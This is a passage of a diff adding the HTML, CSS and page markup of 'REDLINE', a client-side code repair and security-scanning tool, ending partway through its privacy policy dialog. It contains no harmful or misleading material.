@@ -1,0 +1,3162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<!-- ================================================================
+  SECURITY ARCHITECTURE (v7.2)
+  · CSP via meta (static file — a host should ALSO send real headers;
+    frame-ancestors is header-only, so the JS frame banner covers framing)
+  · connect-src 'none'  → the page cannot exfiltrate anything, ever
+  · No eval / no new Function anywhere (user code is parsed, never run)
+  · Non-blocking frame detection — benign local/same-origin previews
+    pass silently; unknown embeds get a dismissible banner
+  · Dual-CDN acorn loader for sandboxed/offline previews
+  · DOM injection monitor + frozen oracle tables
+  · SEC scanner quarantines malicious pastes & leaked secrets
+  · v7.2 sanitize fixes:
+      - escalation ladder (comment → line removal) → always converges
+      - '//' protocol guard (http:// no longer hides threats)
+      - '#' comments only at line start (CSS colors/IDs safe)
+      - 300-step hard cap; failure names worst remaining rules
+================================================================ -->
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self' 'unsafe-inline' https://unpkg.com https://cdn.jsdelivr.net; img-src data: https://unpkg.com https://cdn.jsdelivr.net; connect-src 'none'; form-action 'none'; base-uri 'none'; object-src 'none'; frame-src 'none'; media-src 'none'; worker-src 'none'; manifest-src 'none'">
+<meta name="referrer" content="no-referrer">
+<meta name="robots" content="noarchive">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>REDLINE — secure live repair engine · zero upload · zero execution</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23C0331B'/%3E%3Ctext x='16' y='23' font-size='20' font-family='Georgia' font-weight='bold' text-anchor='middle' fill='%23F5EFE3'%3E¶%3C/text%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,300..900;1,9..144,300..900&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400&family=Caveat:wght@500;600;700&display=swap" rel="stylesheet">
+<!-- acorn pinned to exact version. For production hosting, generate a real
+     SRI hash and add:  integrity="sha384-<REAL-HASH>" crossorigin="anonymous" -->
+<script src="https://unpkg.com/acorn@8.11.3/dist/acorn.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script>
+/* CDN fallback: if unpkg is unreachable (offline sandbox), try jsdelivr */
+(function(){
+  function boot(){
+    if(typeof acorn!=='undefined')return;
+    var s=document.createElement('script');
+    s.src='https://cdn.jsdelivr.net/npm/acorn@8.11.3/dist/acorn.min.js';
+    s.crossOrigin='anonymous';
+    s.setAttribute('data-rl-own','1');   /* exempt from the injection guard */
+    document.head.appendChild(s);
+  }
+  if(document.readyState==='complete')setTimeout(boot,0);
+  else window.addEventListener('load',function(){setTimeout(boot,0);});
+})();
+</script>
+<style>
+  :root{
+    --paper:#F5EFE3; --paper-2:#EFE7D6; --paper-3:#E9DFCB;
+    --ink:#1B1710; --ink-2:#4C4436; --ink-3:#8A7F6A;
+    --line:#D9CEB6; --line-2:#C8BB9F;
+    --red:#C0331B; --red-deep:#8F2510; --red-wash:rgba(192,51,27,.08);
+    --green:#1E6B4A; --green-wash:rgba(30,107,74,.10);
+    --amber:#8A5A0E; --amber-wash:rgba(138,90,14,.10);
+    --mono:'JetBrains Mono',ui-monospace,Menlo,monospace;
+    --serif:'Fraunces',Georgia,serif;
+    --hand:'Caveat',cursive;
+    --codeFS:13.5px;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    background:var(--paper); color:var(--ink); font-family:var(--serif);
+    display:grid; grid-template-rows:auto auto auto 1fr auto; height:100vh; overflow:hidden; position:relative;
+  }
+  body::before{
+    content:''; position:fixed; inset:0; pointer-events:none; z-index:99; opacity:.05;
+    background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='140' height='140'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='2'/%3E%3C/filter%3E%3Crect width='140' height='140' filter='url(%23n)'/%3E%3C/svg%3E");
+  }
+  ::selection{background:rgba(192,51,27,.22)}
+  button{font-family:inherit; cursor:pointer}
+  button:focus-visible, textarea:focus-visible{outline:2px solid var(--red); outline-offset:2px}
+  .btn svg,.ibtn svg,.lockchip svg,.secchip svg{fill:none; stroke:currentColor; stroke-width:2; stroke-linecap:round; stroke-linejoin:round}
+
+  .mast{display:flex; align-items:flex-end; gap:34px; flex-wrap:wrap; padding:16px 26px 14px; border-bottom:1px solid var(--ink); box-shadow:0 3px 0 -1px var(--ink)}
+  .mast-left{flex:0 0 auto}
+  .wordmark{font:900 31px/0.95 var(--serif); letter-spacing:-.015em; position:relative; display:inline-block}
+  .wavy{position:absolute; left:-2px; bottom:-9px; width:calc(100% + 4px); height:9px; color:var(--red)}
+  .brand-sub{font:600 9.5px var(--mono); letter-spacing:.28em; color:var(--ink-3); margin-top:13px}
+  .hero{font:600 25px/1.12 var(--serif); letter-spacing:-.01em; flex:1 1 380px; min-width:300px}
+  .hero-sub{display:block; font:italic 400 14.5px/1.35 var(--serif); color:var(--ink-2); margin-top:5px}
+  .strike-wrap{position:relative; display:inline-block; padding:0 .05em}
+  .strike{position:absolute; left:-4%; top:52%; width:108%; height:.3em; color:var(--red)}
+  .mend{position:absolute; left:50%; top:-.72em; transform:translateX(-58%) rotate(-8deg); font:600 .56em var(--hand); color:var(--red); white-space:nowrap}
+  .stamp-chip{align-self:flex-start; margin-left:auto; color:var(--red); border:2px solid var(--red); border-radius:3px; padding:6px 12px; font:700 10px var(--mono); letter-spacing:.2em; text-align:center; transform:rotate(4deg); position:relative}
+  .stamp-chip::after{content:''; position:absolute; inset:2.5px; border:1px solid var(--red); border-radius:2px; opacity:.6}
+  .stamp-chip span{display:block; font-weight:600; font-size:8.5px; letter-spacing:.3em; margin-top:3px; opacity:.85}
+
+  .toolbar{display:flex; align-items:center; gap:18px; flex-wrap:wrap; padding:9px 26px; border-bottom:1px solid var(--line-2); background:var(--paper-2)}
+  .tb-group{display:flex; align-items:center; gap:6px; flex-wrap:wrap}
+  .tb-label{font:700 9.5px var(--mono); letter-spacing:.22em; color:var(--ink-3); margin-right:4px}
+  .chip{font:600 10px var(--mono); letter-spacing:.12em; padding:5px 9px; border:1px solid var(--line-2); background:transparent; color:var(--ink-2); border-radius:2px; transition:all .15s ease}
+  .chip:hover{border-color:var(--ink); color:var(--ink)}
+  .chip.on{background:var(--ink); color:var(--paper); border-color:var(--ink)}
+  .chip.ghost{border-style:dashed}
+  .chip:disabled{opacity:.4; cursor:not-allowed}
+  .chip.danger{border-color:var(--red); color:var(--red)}
+  .chip.danger:hover{background:var(--red); color:var(--paper)}
+  .detected{font:600 10px var(--mono); letter-spacing:.14em; color:var(--red); margin-left:6px; min-width:130px}
+  .tb-spacer{flex:1}
+  .btn{display:inline-flex; align-items:center; gap:7px; font:700 10.5px var(--mono); letter-spacing:.16em; padding:9px 14px; border:1px solid var(--ink); background:transparent; color:var(--ink); border-radius:2px; transition:all .15s ease}
+  .btn:hover{background:var(--ink); color:var(--paper)}
+  .btn:active{transform:translateY(1px)}
+  .btn.primary{background:var(--ink); color:var(--paper)}
+  .btn.primary:hover{background:var(--red); border-color:var(--red)}
+  .btn svg{width:13px; height:13px}
+  .btn:disabled{opacity:.35; cursor:not-allowed}
+  .btn:disabled:hover{background:transparent; color:var(--ink)}
+  .btn.armed{background:var(--red); border-color:var(--red); color:var(--paper); opacity:1; animation:pulseA 1.5s ease-in-out infinite}
+  .btn.armed:hover{background:var(--red-deep); border-color:var(--red-deep)}
+  .btn.done{background:var(--green); border-color:var(--green); color:var(--paper); opacity:1}
+  .btn.done:disabled{cursor:default}
+  .btn.done:disabled:hover{background:var(--green); color:var(--paper)}
+  @keyframes pulseA{50%{box-shadow:0 0 0 7px rgba(192,51,27,.16)}}
+  .ibtn{display:inline-flex; align-items:center; justify-content:center; width:28px; height:26px; border:1px solid var(--line-2); background:transparent; color:var(--ink-2); border-radius:2px; transition:all .15s}
+  .ibtn:hover{border-color:var(--ink); color:var(--ink); background:var(--paper)}
+  .ibtn svg{width:13px; height:13px}
+  .ibtn:disabled{cursor:not-allowed}
+  .ibtn.locked{opacity:.42; border-style:dashed}
+  .ibtn.locked:hover{border-color:var(--line-2); color:var(--ink-2); background:transparent}
+  .ibtn .ic-lock{display:none}
+  .ibtn.locked .ic-main{display:none}
+  .ibtn.locked .ic-lock{display:block}
+  .ibtn.justUnlocked{animation:btnPop .5s cubic-bezier(.34,1.56,.64,1); border-color:var(--green); color:var(--green)}
+  @keyframes btnPop{0%{transform:scale(.6)}60%{transform:scale(1.2)}100%{transform:scale(1)}}
+
+  .ticker{overflow:hidden; border-bottom:1px solid var(--line); background:var(--paper)}
+  .tick-inner{display:flex; width:max-content; animation:tick 36s linear infinite; will-change:transform}
+  .ticker:hover .tick-inner{animation-play-state:paused}
+  .tick-inner span{font:600 9.5px var(--mono); letter-spacing:.24em; color:var(--ink-2); padding:7px 0; white-space:nowrap}
+  .tick-inner b{color:var(--red); font-weight:700; padding:7px 20px}
+  @keyframes tick{to{transform:translateX(-50%)}}
+
+  .work{display:grid; grid-template-columns:minmax(0,1fr) 302px minmax(0,1fr); min-height:0}
+  .pane{display:flex; flex-direction:column; min-height:0; min-width:0}
+  .pane + .pane{border-left:1px solid var(--line-2)}
+  .pane-head{display:flex; align-items:center; gap:9px; padding:9px 14px; border-bottom:1px solid var(--line); background:var(--paper-2); flex-wrap:wrap}
+  .p-idx{font:700 10px var(--mono); color:var(--red)}
+  .p-name{font:700 10.5px var(--mono); letter-spacing:.22em}
+  .p-meta{margin-left:auto; font:600 9.5px var(--mono); letter-spacing:.14em; color:var(--ink-3)}
+  .head-btns{display:flex; align-items:center; gap:6px; margin-left:auto}
+  .seg{display:flex; border:1px solid var(--line-2); border-radius:2px; overflow:hidden}
+  .seg-btn{font:600 9.5px var(--mono); letter-spacing:.1em; padding:5px 9px; border:0; background:transparent; color:var(--ink-3)}
+  .seg-btn.on{background:var(--ink); color:var(--paper)}
+  .lockchip{display:inline-flex; align-items:center; gap:6px; font:700 8.5px var(--mono); letter-spacing:.16em; padding:4px 8px; border:1.5px dashed var(--red); color:var(--red); border-radius:2px}
+  .lockchip svg{width:11px; height:11px}
+  .lockchip .ic-open{display:none}
+  .lockchip.unlocked{border:1.5px solid var(--green); color:var(--green); animation:unlockPop .5s cubic-bezier(.34,1.56,.64,1)}
+  .lockchip.unlocked .ic-open{display:block}
+  .lockchip.unlocked .ic-lock{display:none}
+  @keyframes unlockPop{0%{transform:scale(.7)}55%{transform:scale(1.14)}100%{transform:scale(1)}}
+  .secchip{display:inline-flex; align-items:center; gap:6px; font:700 8.5px var(--mono); letter-spacing:.16em; padding:4px 8px; border:1.5px solid var(--green); color:var(--green); border-radius:2px}
+  .secchip svg{width:11px; height:11px}
+  .secchip.warn{border-color:var(--amber); color:var(--amber)}
+  .secchip.crit{border-color:var(--red); color:var(--red); animation:unlockPop .5s cubic-bezier(.34,1.56,.64,1)}
+
+  .ed-wrap{position:relative; flex:1; min-height:0; background:var(--paper); transition:opacity .25s}
+  .ed-wrap.busy{opacity:.5; pointer-events:none}
+  .ed-hl,.ed-ta{position:absolute; inset:0; padding:14px 18px 14px 60px; margin:0; font:400 var(--codeFS)/1.6 var(--mono); font-variant-ligatures:none; white-space:pre; tab-size:4}
+  .ed-hl{overflow:hidden; pointer-events:none; color:var(--ink); z-index:1}
+  .ed-ta{z-index:2; background:transparent; color:transparent; caret-color:var(--red); border:0; outline:0; resize:none; overflow:auto}
+  .ed-ta::placeholder{color:#AC9F83; font-family:var(--mono); font-size:var(--codeFS); line-height:1.6}
+  .ed-ta::selection{background:rgba(192,51,27,.25); color:transparent}
+  .gutter{position:absolute; left:0; top:0; bottom:0; width:46px; z-index:3; overflow:hidden; padding:14px 0; border-right:1px solid rgba(192,51,27,.30); background:var(--paper); font:400 11px/calc(var(--codeFS) * 1.6) var(--mono); color:#B0A488; text-align:right; pointer-events:none}
+  .gutter div{padding-right:9px}
+
+  .tk-c{color:#9A9080; font-style:italic}
+  .tk-s{color:#23684B}
+  .tk-k{color:#B0341F}
+  .tk-b{color:#B0341F; font-weight:600}
+  .tk-n{color:#8A5A0E}
+  .tk-t{color:#5F5442; font-weight:600}
+
+  .ledger-pane{background:var(--paper-2)}
+  .ledger{flex:1; overflow:auto; padding:4px 0 18px}
+  .entry{padding:9px 14px 10px; border-bottom:1px dashed var(--line-2); animation:eIn .34s cubic-bezier(.2,.7,.3,1) both}
+  @keyframes eIn{from{opacity:0; transform:translateX(-10px)}}
+  .entry.detected{border-left:2px solid var(--red)}
+  .entry.secentry{border-left:3px solid var(--amber); background:var(--amber-wash)}
+  .entry.seccrit{border-left:3px solid var(--red); background:var(--red-wash)}
+  .e-top{display:flex; align-items:baseline; gap:8px}
+  .e-num{font:700 11px var(--mono); color:var(--red)}
+  .e-num.sh{color:var(--amber)}
+  .e-rule{font:600 10px var(--mono); letter-spacing:.1em}
+  .e-loc{margin-left:auto; font:700 9.5px var(--mono); color:var(--red); background:var(--red-wash); padding:1px 6px; border-radius:2px}
+  .e-w{font:700 8.5px var(--mono); color:var(--amber); border:1px solid var(--amber); border-radius:2px; padding:0 4px}
+  .e-msg{margin-top:3px; font:italic 400 11.5px/1.4 var(--serif); color:var(--ink-2)}
+  .e-code{margin-top:6px; font:11px/1.55 var(--mono); background:var(--paper); border:1px solid var(--line); border-radius:2px; padding:5px 8px; word-break:break-all}
+  .e-code .rm{color:var(--red-deep); text-decoration:line-through}
+  .e-code .ad{color:var(--green); font-weight:600}
+  .e-code .sep{color:var(--ink-3); margin:0 6px}
+  .e-probe{margin-top:5px; font:600 8.5px/1.4 var(--mono); letter-spacing:.08em}
+  .e-probe.ok{color:var(--green)}
+  .e-probe.no{color:var(--red-deep); opacity:.85}
+  .entry.more{font:600 10px var(--mono); letter-spacing:.14em; color:var(--ink-3); border-bottom:0}
+  .entry.unresolved{border-left:3px solid var(--red); background:var(--red-wash)}
+  .entry.reroute{border-left:3px solid var(--amber); background:rgba(138,90,14,.07)}
+  .entry.endsess{border-left:3px solid var(--ink-2); font:700 10px var(--mono); letter-spacing:.12em}
+  .entry.prognosis{margin:10px 14px 0; border:1px solid var(--line-2); border-radius:2px; padding:8px 12px; font:700 10px var(--mono); letter-spacing:.14em}
+  .entry.prognosis.p-good{color:var(--green); border-color:var(--green)}
+  .entry.prognosis.p-bad{color:var(--red); border-color:var(--red)}
+  .entry.prognosis.p-quar{color:var(--red); border-color:var(--red); background:var(--red-wash)}
+  .margin-note{font:600 22px/1.25 var(--hand); color:rgba(162,45,23,.8); padding:26px 20px; transform:rotate(-1.4deg)}
+  .pane-foot{padding:7px 14px; border-top:1px solid var(--line); font:600 9.5px var(--mono); letter-spacing:.18em; color:var(--ink-3)}
+
+  .out-body{position:relative; flex:1; min-height:0; overflow:auto; padding:12px 0 30px; font:400 var(--codeFS)/1.6 var(--mono); font-variant-ligatures:none}
+  .dl{display:block; position:relative; padding:0 18px 0 60px; white-space:pre; min-height:1.6em}
+  .dl .ln{position:absolute; left:0; top:0; width:36px; padding-right:10px; text-align:right; color:#B0A488; font-size:11px; line-height:inherit; border-right:1px solid rgba(192,51,27,.28)}
+  .dl.errline{background:var(--red-wash); box-shadow:inset 2px 0 0 var(--red)}
+  .dl.errline .ln{color:var(--red); font-weight:700}
+  .dl.del{background:var(--red-wash); box-shadow:inset 2px 0 0 var(--red); color:#8a5546; text-decoration:line-through; text-decoration-color:rgba(192,51,27,.8); text-decoration-thickness:1.5px}
+  .dl.add{background:var(--green-wash); box-shadow:inset 2px 0 0 var(--green)}
+  .dl.add .ln{color:var(--green); font-weight:700}
+  .dl.mod{background:#EFE5D0; box-shadow:inset 2px 0 0 var(--red)}
+  .dl.hot{animation:hotFlash 1.1s ease}
+  @keyframes hotFlash{0%{filter:brightness(.55) saturate(2.4)}45%{filter:brightness(1.3) saturate(1.6)}100%{filter:none}}
+  .cr{color:var(--red-deep); background:var(--red-wash); text-decoration:line-through; text-decoration-thickness:1.5px}
+  .ca{color:var(--green); font-weight:600; background:var(--green-wash); text-decoration:underline; text-decoration-color:rgba(30,107,74,.55); text-underline-offset:3px}
+  .plain-code{padding:2px 18px 2px 60px; white-space:pre; min-width:max-content}
+  .out-empty{height:100%; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:12px; color:#B0A488; text-align:center}
+  .out-empty .orn{font:400 110px/1 var(--serif); color:rgba(192,51,27,.14); transform:rotate(-8deg)}
+  .out-empty p{font:600 21px var(--hand); color:rgba(162,45,23,.65); transform:rotate(-1.5deg)}
+  .out-empty small{font:600 9.5px var(--mono); letter-spacing:.22em; color:var(--ink-3); max-width:340px; line-height:2}
+
+  .stamp{position:absolute; top:16px; right:20px; z-index:6; pointer-events:none; padding:8px 15px 7px; border:2.5px solid currentColor; border-radius:3px; font:700 11px var(--mono); letter-spacing:.16em; color:var(--red); background:rgba(245,239,227,.75); backdrop-filter:blur(1.5px); animation:stampIn .4s cubic-bezier(.34,1.56,.64,1) both}
+  .stamp::after{content:''; position:absolute; inset:3px; border:1px solid currentColor; border-radius:2px; opacity:.65}
+  .stamp.ok{color:var(--green)}
+  .stamp.live{color:var(--amber)}
+  .stamp.quar{color:var(--red-deep)}
+  @keyframes stampIn{0%{opacity:0; transform:rotate(-17deg) scale(2.3)}55%{opacity:1; transform:rotate(-5.5deg) scale(.93)}100%{transform:rotate(-7deg) scale(1)}}
+  .out-foot{display:flex; align-items:center; justify-content:space-between; gap:12px}
+  #errText{overflow:hidden; text-overflow:ellipsis; white-space:nowrap}
+  #errText.bad{color:var(--red)}
+  #errText.good{color:var(--green)}
+  #errText.warn{color:var(--amber)}
+
+  .foot{display:flex; align-items:center; gap:20px; flex-wrap:wrap; padding:8px 26px; border-top:1px solid var(--ink); font:600 9.5px var(--mono); letter-spacing:.18em; color:var(--ink-3)}
+  .foot .mid{color:var(--ink-2)}
+  .foot .right{margin-left:auto; color:var(--red); display:flex; gap:14px; align-items:center}
+  .foot a{color:var(--ink-2); text-decoration:underline; text-decoration-color:var(--line-2); text-underline-offset:3px; cursor:pointer}
+  .foot a:hover{color:var(--red)}
+  .foot b{color:var(--ink-2); font-weight:700}
+
+  .toast{position:fixed; left:50%; bottom:-70px; transform:translateX(-50%); background:var(--ink); color:var(--paper); font:600 11px var(--mono); letter-spacing:.12em; padding:11px 20px; border-radius:3px; z-index:300; transition:bottom .3s cubic-bezier(.2,.8,.3,1.2); box-shadow:0 6px 22px rgba(27,23,16,.25); pointer-events:none}
+  .toast.show{bottom:26px}
+  .toast.good{background:var(--green)}
+  .toast.bad{background:var(--red)}
+
+  dialog#policyDlg{
+    border:1px solid var(--ink); border-radius:4px; background:var(--paper); color:var(--ink);
+    max-width:680px; width:calc(100vw - 60px); max-height:80vh; padding:0;
+    font-family:var(--serif);
+  }
+  dialog#policyDlg::backdrop{background:rgba(27,23,16,.55)}
+  .dlg-head{display:flex; align-items:center; gap:12px; padding:16px 22px; border-bottom:1px solid var(--ink); background:var(--paper-2)}
+  .dlg-head h2{font:900 20px var(--serif); letter-spacing:-.01em}
+  .dlg-tabs{display:flex; gap:6px; margin-left:auto}
+  .dlg-tabs button{font:700 9px var(--mono); letter-spacing:.14em; padding:5px 9px; border:1px solid var(--line-2); background:transparent; color:var(--ink-2); border-radius:2px}
+  .dlg-tabs button.on{background:var(--ink); color:var(--paper); border-color:var(--ink)}
+  .dlg-body{padding:18px 22px 22px; overflow:auto; max-height:60vh}
+  .dlg-body h3{font:900 13px var(--mono); letter-spacing:.14em; color:var(--red); margin:14px 0 6px}
+  .dlg-body h3:first-child{margin-top:0}
+  .dlg-body p, .dlg-body li{font:400 13.5px/1.6 var(--serif); color:var(--ink-2); margin-bottom:6px}
+  .dlg-body ul{padding-left:20px; margin-bottom:10px}
+  .dlg-body code{font:600 11px var(--mono); background:var(--paper-2); border:1px solid var(--line); border-radius:2px; padding:1px 5px}
+  .dlg-foot{padding:12px 22px; border-top:1px solid var(--line); text-align:right}
+  .dlg-foot button{font:700 10px var(--mono); letter-spacing:.16em; padding:8px 16px; border:1px solid var(--ink); background:transparent; color:var(--ink); border-radius:2px}
+  .dlg-foot button:hover{background:var(--ink); color:var(--paper)}
+
+  ::-webkit-scrollbar{width:11px; height:11px}
+  ::-webkit-scrollbar-track{background:transparent}
+  ::-webkit-scrollbar-thumb{background:var(--line-2); border:3px solid var(--paper); border-radius:6px}
+  ::-webkit-scrollbar-thumb:hover{background:var(--ink-3)}
+  *{scrollbar-width:thin; scrollbar-color:var(--line-2) transparent}
+
+  @media (max-width:1200px){ .work{grid-template-columns:minmax(0,1fr) 250px minmax(0,1fr)} .hero{font-size:21px} }
+  @media (max-width:980px){
+    body{height:auto; min-height:100vh; overflow:auto}
+    .work{grid-template-columns:1fr}
+    .pane + .pane{border-left:0; border-top:1px solid var(--line-2)}
+    .ed-wrap{height:340px; flex:none} .out-body{height:340px; flex:none} .ledger{max-height:280px}
+    .mast{gap:16px} .stamp-chip{display:none}
+  }
+</style>
+</head>
+<body>
+
+<noscript><div style="position:fixed;inset:0;background:#F5EFE3;display:flex;align-items:center;justify-content:center;padding:40px;z-index:9999"><div style="max-width:560px;border:3px solid #C0331B;border-radius:4px;padding:34px 38px;color:#C0331B;text-align:center;font-family:Georgia,serif"><h2 style="font-size:30px;margin-bottom:12px">JavaScript required</h2><p style="color:#4C4436;font-style:italic">This tool parses code entirely in your browser. With scripts disabled it cannot run — and that is by design: your code is never sent anywhere.</p></div></div></noscript>
+
+<header class="mast">
+  <div class="mast-left">
+    <div class="wordmark">REDLINE
+      <svg class="wavy" viewBox="0 0 150 10" preserveAspectRatio="none" aria-hidden="true">
+        <path d="M3 6 Q 15 2, 27 6 T 51 6 T 75 6 T 99 6 T 123 6 T 147 6" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"/>
+      </svg>
+    </div>
+    <div class="brand-sub">SECURE · ZERO UPLOAD · ZERO EXECUTION · CSP · ANTI-TAMPER · MALWARE QUARANTINE</div>
+  </div>
+  <h1 class="hero">
+    Paste
+    <span class="strike-wrap">broken<svg class="strike" viewBox="0 0 100 14" preserveAspectRatio="none" aria-hidden="true"><path d="M3 8 C 28 4, 64 10, 97 5" fill="none" stroke="currentColor" stroke-width="3.2" stroke-linecap="round"/></svg><span class="mend">mended</span></span>
+    code.
+    <span class="hero-sub">RUN PROOF scans for malware &amp; leaked secrets, then identifies syntax errors. AUTO FIX / SANITIZE repairs live — one real checked repair per pass, always converging. Your code never leaves this tab and is never executed.</span>
+  </h1>
+  <div class="stamp-chip">NO SERVER<span>CSP ENFORCED</span></div>
+</header>
+
+<div class="toolbar">
+  <div class="tb-group">
+    <span class="tb-label">LANG</span>
+    <button class="chip on" data-lang="auto">AUTO</button>
+    <button class="chip" data-lang="js">JS</button>
+    <button class="chip" data-lang="java">JAVA</button>
+    <button class="chip" data-lang="python">PY</button>
+    <button class="chip" data-lang="json">JSON</button>
+    <button class="chip" data-lang="css">CSS</button>
+    <button class="chip" data-lang="html">HTML</button>
+    <button class="chip" data-lang="xml">XML</button>
+    <span class="detected" id="detected"></span>
+  </div>
+  <div class="tb-group">
+    <span class="tb-label">SAMPLES</span>
+    <button class="chip ghost" data-sample="js">broken js</button>
+    <button class="chip ghost" data-sample="java">broken java</button>
+    <button class="chip ghost" data-sample="python">broken python</button>
+    <button class="chip ghost" data-sample="json">broken json</button>
+    <button class="chip ghost" data-sample="css">broken css</button>
+    <button class="chip ghost" data-sample="html">broken html</button>
+    <button class="chip ghost" data-sample="xml">broken xml</button>
+    <button class="chip ghost danger" data-sample="unsafe">⚠ unsafe paste</button>
+  </div>
+  <div class="tb-spacer"></div>
+  <button class="btn" id="clearBtn"><svg viewBox="0 0 24 24"><path d="M20 20H7L3 16c-.8-.8-.8-2 0-2.8L12.2 3a2 2 0 0 1 2.8 0L21 9c.8.8.8 2 0 2.8L12.8 20"/><path d="M7 12l5 5"/></svg>CLEAR</button>
+  <button class="btn primary" id="runBtn"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>RUN PROOF</button>
+  <button class="btn" id="fixBtn" disabled title="Live repair — armed after RUN PROOF">
+    <svg viewBox="0 0 24 24"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>
+    <span id="fixTxt">AUTO FIX</span>
+  </button>
+</div>
+
+<div class="ticker" aria-hidden="true"><div class="tick-inner" id="ticker"></div></div>
+
+<main class="work">
+  <section class="pane">
+    <div class="pane-head">
+      <span class="p-idx">01</span><span class="p-name">SOURCE</span>
+      <span class="p-meta" id="inStats">0 LINES · 0 CHARS</span>
+    </div>
+    <div class="ed-wrap" id="edWrap">
+      <div class="gutter" id="gutter"></div>
+      <pre class="ed-hl" id="hl" aria-hidden="true"></pre>
+      <textarea id="ed" spellcheck="false" wrap="off" autocomplete="off" autocorrect="off" autocapitalize="off"
+        placeholder="Paste your broken code here — Python, JavaScript, Java, JSON, CSS, HTML or XML…"></textarea>
+    </div>
+  </section>
+
+  <section class="pane ledger-pane">
+    <div class="pane-head">
+      <span class="p-idx">02</span><span class="p-name" id="pane2Name">ISSUES FOUND</span>
+      <span class="p-meta" id="fixCount">—</span>
+    </div>
+    <div class="ledger" id="ledger">
+      <div class="margin-note">paste code, then press<br>RUN PROOF — security scan<br>+ errors show here.</div>
+    </div>
+    <div class="pane-foot" id="passInfo">AWAITING PROOF</div>
+  </section>
+
+  <section class="pane">
+    <div class="pane-head">
+      <span class="p-idx">03</span><span class="p-name">RESULT</span>
+      <div class="head-btns">
+        <span class="secchip" id="secChip">
+          <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          <span id="secTxt">SEC: —</span>
+        </span>
+        <span class="lockchip locked" id="lockChip" data-state="locked">
+          <svg class="ic-lock" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          <svg class="ic-open" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg>
+          <span id="lockTxt">COPY LOCKED</span>
+        </span>
+        <div class="seg">
+          <button class="seg-btn on" data-view="diff">MARKED</button>
+          <button class="seg-btn" data-view="plain">PLAIN</button>
+        </div>
+        <button class="ibtn locked" id="copyBtn" disabled title="Copy — unlocks after verification">
+          <svg class="ic-lock" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          <svg class="ic-main" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+        </button>
+        <button class="ibtn locked" id="dlBtn" disabled title="Download — unlocks after verification">
+          <svg class="ic-lock" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          <svg class="ic-main" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+        </button>
+      </div>
+    </div>
+    <div class="out-body" id="out"></div>
+    <div class="pane-foot out-foot">
+      <span id="errText"></span>
+      <span id="outMeta"></span>
+    </div>
+    <div class="stamp" id="stamp" hidden></div>
+  </section>
+</main>
+
+<footer class="foot">
+  <span><b>PRIVATE BY DESIGN</b> — connect-src 'none': this page cannot transmit your code</span>
+  <span class="mid">parsed, never executed · CSP · frame banner · injection monitor · malware &amp; secrets scanner</span>
+  <span class="right">
+    <a id="lnkPrivacy">PRIVACY</a><a id="lnkSec">SECURITY</a><a id="lnkAup">ANTI-MALVERTISING</a>
+    <span style="color:var(--red)">⌘/CTRL+↵ PROOF · ⇧+↵ FIX/STOP</span>
+  </span>
+</footer>
+
+<div class="toast" id="toast"></div>
+
+<dialog id="policyDlg" aria-labelledby="dlgTitle">
+  <div class="dlg-head">
+    <h2 id="dlgTitle">Policies</h2>
+    <div class="dlg-tabs">
+      <button data-tab="privacy">PRIVACY</button>
+      <button data-tab="security">SECURITY</button>
+      <button data-tab="aup">ANTI-MALVERTISING / AUP</button>
+    </div>
+  </div>
+  <div class="dlg-body" id="dlgBody">
+    <div data-pane="privacy">
+      <h3>PRIVACY POLICY</h3>
+      <ul>
+        <li><b>Zero upload.</b> Everything you paste is processed in this tab's memory only. The page declares <code>connect-src 'none'</code> in its Content-Security-Policy — the browser itself forbids any network request this page could make. There is no backend to send it to.</li>
+        <li><b>No cookies, no analytics, no telemetry, no fingerprinting.</b> Nothing is written to <code>localStorage</code> or indexedDB. Close the tab and your code is gone.</li>
+        <li><b>Clipboard &amp; downloads are user-initiated only</b>, and only ever contain the code you pasted (after it passed verification).</li>
+        <li><b>Referrer is suppressed</b> (<code>no-referrer</code>) so third parties can't learn you visited via a referring page.</li>
